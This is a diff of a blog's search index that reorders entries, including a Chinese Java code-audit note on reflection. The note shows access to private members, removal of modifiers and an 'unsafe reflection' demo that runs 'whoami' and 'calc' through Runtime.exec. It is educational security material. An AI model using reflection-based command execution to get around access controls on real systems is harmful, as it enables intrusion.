@@ -1,18 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello world</title>
-    <url>/2023/07/18/blog0000-hello-world/</url>
-    <content><![CDATA[<h2 id="写在前面的一些话">写在前面的一些话</h2>
-<p>Welcome to my blog!</p>
-<span id="more"></span>
-<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
-]]></content>
-      <tags>
-        <tag>preface</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>命令执行绕过总结</title>
     <url>/2022/03/01/blog0001-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<p>命令执行是最开始学习CTF接触到的内容，RCE大概是Web人最先领会到的攻防魅力。</p>
@@ -108,6 +96,18 @@ href="https://blog.csdn.net/JC_xxx/article/details/108921607">Linux
         <tag>CTF</tag>
         <tag>Web</tag>
         <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello world</title>
+    <url>/2023/07/18/blog0000-hello-world/</url>
+    <content><![CDATA[<h2 id="写在前面的一些话">写在前面的一些话</h2>
+<p>Welcome to my blog!</p>
+<span id="more"></span>
+<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
+]]></content>
+      <tags>
+        <tag>preface</tag>
       </tags>
   </entry>
   <entry>
@@ -1613,139 +1613,6 @@ href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-atta
       </tags>
   </entry>
   <entry>
-    <title>Java代码审计 Java安全基础</title>
-    <url>/2023/09/04/blog0031-1-Java-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p>上一节，主要记录了IDEA配置基础的Java项目，属于相对比较繁琐的内容。</p>
-<p>这一节，将会针对Java
-SE的基础语法进行说明。网络上已经有很多非常成熟的Java
-SE的博客，因此这一篇将不会过多关注Java SE开发入门的相关内容。</p>
-<p>这一篇章的重点将会关注在Java安全领域内一些重点概念，例如反射、反序列化等等。</p>
-<span id="more"></span>
-<h1 id="入门博客">1、入门博客</h1>
-<p>Java常见的开发教程非常多，推荐如下：</p>
-<p><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程
-Java入门</a></p>
-<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744">廖雪峰
-Java入门教程</a></p>
-<h1 id="基础">2、基础</h1>
-<p>这一部分主要是介绍一些trick，并不涉及非常具体底层的技术细节。</p>
-<h2 id="变量命名">2.1、变量命名</h2>
-<p>很多博客里都不会提到的Java标识符命名规范：</p>
-<ol type="1">
-<li>可以使用数字、字母、下划线以及<code>$</code>作为变量命名的组成</li>
-<li>不能以数字开头</li>
-<li>区分大小写</li>
-</ol>
-<p>补充这个点主要可以在Java命名<code>$_POST</code>这样的PHP形式变量，感觉非常有意思。</p>
-<h1 id="反射">3、反射</h1>
-<p>反射（Reflection）是 Java 的特征之一，它允许<strong>运行</strong>中的
-Java
-程序获取自身的信息，并且<strong>可以操作类或对象的内部属性</strong>。简而言之，在<strong>程序在运行期</strong>可以拿到一个对象的所有信息。</p>
-<p>反射在开发中的一个重要体现就是框架的兼容性，框架通过运行中读取配置文件，从而实现不同类的动态加载。</p>
-<h2 id="获取class对象">3.1、获取Class对象</h2>
-<h3 id="class对象简介">3.1.1、Class对象简介</h3>
-<p>在Java中用来表示运行时类型信息的对应类就是Class类，对应于JDK的
-java.lang.Class类。Class类被创建后的对象就是<strong>Class对象</strong>，Class对象表示的是自己手动编写类的类型信息，在<strong>Java中每个类都有一个Class对象</strong>。Class对象的信息则会存储在.class文件中。</p>
-<p>当我们new一个对象时，JVM就会将对应的Class对象的信息加载到内存中，然后再根据Class对象创建实例对象或者提供静态变量的引用值。</p>
-<h3 id="类名.class">3.1.2、类名.class</h3>
-<p>假设我们有一个User类，java存在一个内置关键字class表示它的Class对象。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Class userClass = User.class;<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<h3 id="类方法getclass">3.1.3、类方法getClass</h3>
-<p>类中也存在对应的方法getClass用于获取对应的Class对象的内容。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        Class userClass = user.getClass();<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<h3 id="反射机制forname方式">3.1.4、反射机制forName方式</h3>
-<p>我们提到Class对象是Class类的实例，那么在Class类中也存在对应的静态方法forName来实现相应的机制。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>        Class userClass = Class.forName(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>查看<code>Class.forName</code>的实现，本质就是通过Reflection来实现对应的Class对象的加载。</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20240229154657831.png"
-alt="image-20240229154657831" /></p>
-<p><code>Class.forName</code>有两种重载形式</p>
-<ol type="1">
-<li>name：要加载的类的全名</li>
-<li>initalize：是否初始化类</li>
-<li>loader：类加载器</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String name, <span class="hljs-keyword">boolean</span> initialize, ClassLoader loader);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String name);<br></code></pre></td></tr></table></figure>
-<h3 id="反射机制classloader方式">3.1.5、反射机制classLoader方式</h3>
-<p>通过classLoader的方式，我们利用类加载器获取到相应的Class对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-<h2 id="获取类的信息">3.2、获取类的信息</h2>
-<h3 id="常用的api">3.2.1、常用的API</h3>
-<p>这里我们列举常见的Class类的方法，用于获取类的信息。</p>
-<p>在用API的时候，有的时候会混乱，建议理清两个点。</p>
-<ol type="1">
-<li>谁是谁的属性/方法（which belongs to which）</li>
-<li>Field/Method/Class不代表某个单一实例（调用方法，变量修改都是基于实例完成）</li>
-</ol>
-<p>（1）返回类的公有Method</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getMethod(String name, Class&lt;?&gt;... parameterTypes);<br></code></pre></td></tr></table></figure>
-<p>（2）返回所有声明的Method类对象，包括公共，保护，默认（包）访问和私有方法，但不包括继承的方法。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes);<br></code></pre></td></tr></table></figure>
-<p>（3）返回已加载类声明的所有public成员变量的Field对象，包括从父类继承过来的成员变量，参数name指定成员变量的名称。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getField(String name)<br></code></pre></td></tr></table></figure>
-<p>（4）返回当前类所有成员变量的Field对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getDeclaredField(String name)<br></code></pre></td></tr></table></figure>
-<p>（5）返回obj对象的Field属性值</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.get(Object obj) <br></code></pre></td></tr></table></figure>
-<p>（6）向obj对象的这个Field属性设置新值value。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.set(Object obj, Object value) <br></code></pre></td></tr></table></figure>
-<p>（7）返回该Field已声明的修饰符集的整数值。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.getModifiers() <br></code></pre></td></tr></table></figure>
-<p>（8）将该Field的值设置为指定obj对象上的int值。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.setInt(Object obj, <span class="hljs-keyword">int</span> i)<br></code></pre></td></tr></table></figure>
-<p>（9）<strong>field.setAccessible(boolean flag)</strong></p>
-<p>一般情况下，我们并不能对类的私有字段进行操作，而setAccessible则是<strong>启用和禁用访问安全检查的开关</strong>。flag值为
-true 则指示反射的对象在使用时应该取消 Java 语言访问检查。</p>
-<p>（10）java.lang.reflect.Modifier</p>
-<p>修饰符工具类，提供解码类和成员访问修饰符的静态方法和常量，修饰符集合具有表示不同的修饰符的不同位置的整数。</p>
-<p>（11）java.lang.reflect.Modifier.toString(int modifiers)</p>
-<p>获得修饰符的文本形式</p>
-<h3 id="调用公有方法">3.2.2、调用公有方法</h3>
-<p>假设现在有一个User类，User类定义如下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name = <span class="hljs-string">&quot;Tom&quot;</span>;<br>    <span class="hljs-keyword">private</span> String secret = <span class="hljs-string">&quot;cipher&quot;</span>;<br><br>    User(String name)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">setSecret</span><span class="hljs-params">(String secret)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">this</span>.secret = secret;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>这里我们使用<code>getMethod</code>方法获取到getName和setName，实现User类的方法调用</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        Method userGetName = userClass.getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        Object invoke = userGetName.invoke(admin);<br>        System.out.println(<span class="hljs-string">&quot;Reflect get original Name : &quot;</span> + (String)invoke);<br><br>        Method userSetName = userClass.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>        userSetName.invoke(admin, <span class="hljs-string">&quot;admin_new&quot;</span>);<br><br>        invoke = userGetName.invoke(admin);<br>        System.out.println(<span class="hljs-string">&quot;Reflect set new Name : &quot;</span> + (String)invoke);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<h3 id="访问私有方法和属性">3.2.3、访问私有方法和属性</h3>
-<p>访问私有方法和属性，我们要注意<code>setAccessible</code>方法，否则我们的操作会受到访问修饰符的限制。</p>
-<p>在公有方法的基础上，我们绕过访问修饰符从而实现反射。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        Field userSecret = userClass.getDeclaredField(<span class="hljs-string">&quot;secret&quot;</span>);<br>        <span class="hljs-comment">// 修饰符检查</span><br>        userSecret.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object secret = userSecret.get(admin);<br>        System.out.println(<span class="hljs-string">&quot;original secret : &quot;</span> + (String)secret);<br><br>        Method userSetSecret = userClass.getDeclaredMethod(<span class="hljs-string">&quot;setSecret&quot;</span>, String.class);<br>        <span class="hljs-comment">// 修饰符检查</span><br>        userSetSecret.setAccessible(<span class="hljs-keyword">true</span>);<br>        userSetSecret.invoke(admin, <span class="hljs-string">&quot;cipher_new&quot;</span>);<br><br>        secret = userSecret.get(admin);<br>        System.out.println(<span class="hljs-string">&quot;new secret : &quot;</span> + (String)secret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<h3 id="修改属性修饰符">3.2.4、修改属性修饰符</h3>
-<p>Filed对象具有Modifiers属性，用来描述当前Filed表示的属性在类中的修饰符。</p>
-<p>我们可以通过反射获取到secret属性对应的Field对象，再通过反射修改secret
-Field对象的Modifiers属性，能够通过改变修饰符，影响对应的变量。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException</span>&#123;<br><br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        <span class="hljs-comment">// 反射获取secret属性</span><br>        Field userSecret = userClass.getDeclaredField(<span class="hljs-string">&quot;secret&quot;</span>);<br><br>        <span class="hljs-comment">// 反射获取secret的Modifiers</span><br>        Field secretModifiers = userSecret.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>        secretModifiers.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">// 删除对应的PRIVATE属性</span><br>        secretModifiers.setInt(userSecret, userSecret.getModifiers() &amp; ~Modifier.PRIVATE);<br><br>        <span class="hljs-comment">// 注意此时userSecret没有setAccessible</span><br>        <span class="hljs-comment">// 成功修改属性</span><br>        userSecret.set(admin, <span class="hljs-string">&quot;cipher_new&quot;</span>);<br>        System.out.println(admin.getSecret());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<h3 id="获取构造器">3.2.5、获取构造器</h3>
-<p>反射实现实例的构造，Java提供两种方法。</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20240229203926563.png"
-alt="image-20240229203926563" /></p>
-<p>通过Construct属性，我们可获取对象的Construct方法。针对不同的构造器，我们通过反射时指定不同的参数获取相应的构造器。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException, java.lang.InstantiationException</span>&#123;<br><br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        <span class="hljs-comment">// 获取有参构造器</span><br>        Constructor con = userClass.getDeclaredConstructor(String.class);<br>        User user = (User)(con.newInstance(<span class="hljs-string">&quot;user&quot;</span>));<br>        System.out.println(user.getName());<br><br>        <span class="hljs-comment">// 获取无参构造器</span><br>        Constructor con1 = userClass.getDeclaredConstructor(<span class="hljs-keyword">null</span>);<br>        Object user1 = con1.newInstance();<br>        Method userGetName = userClass.getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(userGetName.invoke(user1));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<h2 id="不安全的反射">3.3、不安全的反射</h2>
-<h3 id="命令执行">3.3.1、命令执行</h3>
-<p>基于反射机制，我们能够成功实现命令执行，而不需要显式地导入相应的类。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoExec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;<br>        Class execClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 构造实例</span><br>        Constructor declaredConstructor = execClass.getDeclaredConstructor(<span class="hljs-keyword">null</span>);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        java.lang.Runtime runner =  (java.lang.Runtime) declaredConstructor.newInstance();<br><br>        <span class="hljs-comment">// 命令执行方法</span><br>        Method exec = execClass.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        Process p = (Process)exec.invoke(runner, <span class="hljs-string">&quot;whoami&quot;</span>);<br><br>        <span class="hljs-comment">// 输出结果</span><br>        BufferedReader bufReader = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(p.getInputStream()));<br>        String line = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span>((line = bufReader.readLine()) != <span class="hljs-keyword">null</span>)<br>        &#123;<br>            System.out.println(line);<br>        &#125;<br>        bufReader.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>通过分析一下两个函数test1和test2之间的对应关系，能更好地理解Java反射。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;<br>    Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<br>        Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<br>            <span class="hljs-keyword">null</span>),<span class="hljs-string">&quot;calc&quot;</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure>
-<h1 id="代理模式">4、代理模式</h1>
-<p>代理模式提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，<strong>提供额外的功能操作</strong>，<strong>扩展目标对象的功能</strong>。简言之，代理模式就是设置一个<strong>中间代理</strong>来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。但是对于真正的调用来说,
-实际上并不关心这个代理对象, 只要能够实现相应的业务逻辑就好。</p>
-<h2 id="静态代理">4.1、静态代理</h2>
-<h2 id="动态代理">4.2、动态代理</h2>
-<h1 id="反序列化">5、反序列化</h1>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>Code Audit</tag>
-        <tag>notes</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java代码审计 Java Web基础</title>
     <url>/2023/09/18/blog0031-2-Java%20Web%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>在上一章节，我们学习了Java SE的一些基础。</p>
@@ -1955,6 +1822,139 @@ by之后使用，因为order by其后跟着的是SQL的列名。</p>
 <h3 id="callablestatement">8.4、CallableStatement</h3>
 <p>CallableStatement接口提供了执行存储过程的方法。</p>
 <p>存储过程导致漏洞的原因，其实也是因为参数传入导致字符串拼接，这个跟Java本身的接口实现并没有非常深入的关系。</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>Code Audit</tag>
+        <tag>notes</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java代码审计 Java安全基础</title>
+    <url>/2023/09/04/blog0031-1-Java-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p>上一节，主要记录了IDEA配置基础的Java项目，属于相对比较繁琐的内容。</p>
+<p>这一节，将会针对Java
+SE的基础语法进行说明。网络上已经有很多非常成熟的Java
+SE的博客，因此这一篇将不会过多关注Java SE开发入门的相关内容。</p>
+<p>这一篇章的重点将会关注在Java安全领域内一些重点概念，例如反射、反序列化等等。</p>
+<span id="more"></span>
+<h1 id="入门博客">1、入门博客</h1>
+<p>Java常见的开发教程非常多，推荐如下：</p>
+<p><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程
+Java入门</a></p>
+<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744">廖雪峰
+Java入门教程</a></p>
+<h1 id="基础">2、基础</h1>
+<p>这一部分主要是介绍一些trick，并不涉及非常具体底层的技术细节。</p>
+<h2 id="变量命名">2.1、变量命名</h2>
+<p>很多博客里都不会提到的Java标识符命名规范：</p>
+<ol type="1">
+<li>可以使用数字、字母、下划线以及<code>$</code>作为变量命名的组成</li>
+<li>不能以数字开头</li>
+<li>区分大小写</li>
+</ol>
+<p>补充这个点主要可以在Java命名<code>$_POST</code>这样的PHP形式变量，感觉非常有意思。</p>
+<h1 id="反射">3、反射</h1>
+<p>反射（Reflection）是 Java 的特征之一，它允许<strong>运行</strong>中的
+Java
+程序获取自身的信息，并且<strong>可以操作类或对象的内部属性</strong>。简而言之，在<strong>程序在运行期</strong>可以拿到一个对象的所有信息。</p>
+<p>反射在开发中的一个重要体现就是框架的兼容性，框架通过运行中读取配置文件，从而实现不同类的动态加载。</p>
+<h2 id="获取class对象">3.1、获取Class对象</h2>
+<h3 id="class对象简介">3.1.1、Class对象简介</h3>
+<p>在Java中用来表示运行时类型信息的对应类就是Class类，对应于JDK的
+java.lang.Class类。Class类被创建后的对象就是<strong>Class对象</strong>，Class对象表示的是自己手动编写类的类型信息，在<strong>Java中每个类都有一个Class对象</strong>。Class对象的信息则会存储在.class文件中。</p>
+<p>当我们new一个对象时，JVM就会将对应的Class对象的信息加载到内存中，然后再根据Class对象创建实例对象或者提供静态变量的引用值。</p>
+<h3 id="类名.class">3.1.2、类名.class</h3>
+<p>假设我们有一个User类，java存在一个内置关键字class表示它的Class对象。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Class userClass = User.class;<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="类方法getclass">3.1.3、类方法getClass</h3>
+<p>类中也存在对应的方法getClass用于获取对应的Class对象的内容。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        Class userClass = user.getClass();<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="反射机制forname方式">3.1.4、反射机制forName方式</h3>
+<p>我们提到Class对象是Class类的实例，那么在Class类中也存在对应的静态方法forName来实现相应的机制。</p>
